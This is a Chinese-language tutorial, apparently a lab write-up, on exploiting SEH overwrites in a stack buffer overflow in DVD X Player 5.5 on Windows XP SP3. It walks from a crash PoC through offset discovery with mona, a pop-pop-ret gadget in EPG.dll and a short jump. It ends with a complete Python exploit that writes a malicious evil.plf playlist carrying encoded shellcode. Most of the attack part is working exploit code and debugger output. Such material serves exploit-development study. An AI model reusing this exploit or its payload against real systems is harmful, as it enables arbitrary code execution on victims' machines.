#### SEH 简介
SEH(结构化异常处理) 是windows 为了处理程序执行时错误而创造的一种链式结构，当程序发生异常，
操作系统遍历这个链式结构，异常处理程序可以判断是否可以处理这个异常，不能的话，便传递给下一个处理函数
.所以这个链表的每个节点必须满足以下的数据结构
```
{
  Handle SEHhandle(异常处理函数);
  VOID*  NestSeh;
}
```

当一个异常出现, 最近一个SEH的地址会保存在esp+8地址处.

#### SEH 在栈溢出漏洞中的利用
你可能会想这和漏洞利用有什么关系. 如果我们能够控制一大块缓冲区并且覆写其中一个异常处理函数, 异常发生时候Windows会把寄存
器清0, 因此不能直接跳到Shellcode. 幸运的是这个保护机制有缺陷, 我们只需要用pop pop retn 指令地址覆盖掉SEH. 记住esp+8处保存着
nSEH的地址, pop pop retn执行后程序最终会跳到nSEH处执行. 我们可以控制nSEH这四个字节的空间, 通过在这四个字节空间写入指令
跳转到Shellcode.

软件| 版本
 :-: | -:
 系统| Windows XP Sp3
调试器 | Immunity Debugger
反编译 | IDA
漏洞软件|DVD X Player 5.5

#### POC
我们使用如下的python文件创建evil.plf 文件。使用DVD X Palyer 打开。程序奔溃。如下图,因为这次主要关注的是SEH在漏洞中的利用，如第二张图所示，我们已经复写了
SEH处理函数。
```
#!/usr/bin/python ‐w
filename="evil.plf"
buffer = "A"*2000
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```
各个寄存器的值

![程序奔溃](/images\/搜狗截图20180901163906.png)

![程序奔溃](/images\/Seh.png)

#### Exploit 编写

首先使用mona.py 确定栈内存的大小，方便我们布局我们的内存，我们从下图中可以看出，覆盖SEH
需要612个字节。

![程序奔溃](/images\/搜狗截图20180901165546.png)

接下来我们用下面这样子来替换前面代码相应部分.
buffer = "A"*608 + [nSEH] + [SEH] + "D"*1384
buffer = "A"*608 + "B"*4 + "C"*4 + "D"*1384

在这个P/P/R指令中，pop哪个寄存器都不重要，重要的是ESP两次向更高地址移动然后再执行RET。
我们要把要用pop pop retn 指令覆写SEH,.用mona的
!mona seh
可以帮助我们找到这条指令.看下图, 值得一提的是, mona已经过滤掉来自SafeSEH模块的指针.
```

 Message=  0x61617619 : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [EPG.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.12.21.2006 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\EPG.dll)

```

Buffer: buffer = "A"*608 + "B"*4 + "\x19\x76\x61\x61" + "D"*1384

![程序奔溃](/images\/搜狗截图20180901173105.png)

![程序奔溃](/images\/搜狗截图20180901173041.png)

Jmp opcode
我们需要往后跳至少4个字节(\x90\x90+SEH)才能跳到位于SEH之后的Shellcode, 新的缓冲区布置如下:
buffer = "A"*608 + "\xEB\x04\x90\x90" + "\x19\x76\x61\x61" + "D"*1384
![程序奔溃](/images\/搜狗截图20180901174215.png)



```
#!/usr/bin/python


filename="evil.plf"
Shellcode = (
"\xba\x6f\x3d\x04\x90\xd9\xc7\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1" +
"\x4f\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x8d\xc8\xf8\x78\xd8" +
"\x33\x01\x79\xba\xba\xe4\x48\xe8\xd9\x6d\xf8\x3c\xa9\x20\xf1" +
"\xb7\xff\xd0\x82\xb5\xd7\xd7\x23\x73\x0e\xd9\xb4\xb2\x8e\xb5" +
"\x77\xd5\x72\xc4\xab\x35\x4a\x07\xbe\x34\x8b\x7a\x31\x64\x44" +
"\xf0\xe0\x98\xe1\x44\x39\x99\x25\xc3\x01\xe1\x40\x14\xf5\x5b" +
"\x4a\x45\xa6\xd0\x04\x7d\xcc\xbe\xb4\x7c\x01\xdd\x89\x37\x2e" +
"\x15\x79\xc6\xe6\x64\x82\xf8\xc6\x2a\xbd\x34\xcb\x33\xf9\xf3" +
"\x34\x46\xf1\x07\xc8\x50\xc2\x7a\x16\xd5\xd7\xdd\xdd\x4d\x3c" +
"\xdf\x32\x0b\xb7\xd3\xff\x58\x9f\xf7\xfe\x8d\xab\x0c\x8a\x30" +
"\x7c\x85\xc8\x16\x58\xcd\x8b\x37\xf9\xab\x7a\x48\x19\x13\x22" +
"\xec\x51\xb6\x37\x96\x3b\xdf\xf4\xa4\xc3\x1f\x93\xbf\xb0\x2d" +
"\x3c\x6b\x5f\x1e\xb5\xb5\x98\x61\xec\x01\x36\x9c\x0f\x71\x1e" +
"\x5b\x5b\x21\x08\x4a\xe4\xaa\xc8\x73\x31\x7c\x99\xdb\xea\x3c" +
"\x49\x9c\x5a\xd4\x83\x13\x84\xc4\xab\xf9\xb3\xc3\x3c\xc2\x6c" +
"\xa4\x38\xaa\x6e\x3a\x66\x2f\xe6\xdc\x02\x3f\xae\x77\xbb\xa6" +
"\xeb\x03\x5a\x26\x26\x83\xff\xb5\xad\x53\x89\xa5\x79\x04\xde" +
"\x18\x70\xc0\xf2\x03\x2a\xf6\x0e\xd5\x15\xb2\xd4\x26\x9b\x3b" +
"\x98\x13\xbf\x2b\x64\x9b\xfb\x1f\x38\xca\x55\xc9\xfe\xa4\x17" +
"\xa3\xa8\x1b\xfe\x23\x2c\x50\xc1\x35\x31\xbd\xb7\xd9\x80\x68" +
"\x8e\xe6\x2d\xfd\x06\x9f\x53\x9d\xe9\x4a\xd0\xad\xa3\xd6\x71" +
"\x26\x6a\x83\xc3\x2b\x8d\x7e\x07\x52\x0e\x8a\xf8\xa1\x0e\xff" +
"\xfd\xee\x88\xec\x8f\x7f\x7d\x12\x23\x7f\x54")

evil = "\x90"*20 + Shellcode
buffer = "A"*608 + "\xEB\x04\x90\x90" + "\x19\x76\x61\x61" + evil + "B"*(1384‐len(evil))
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```
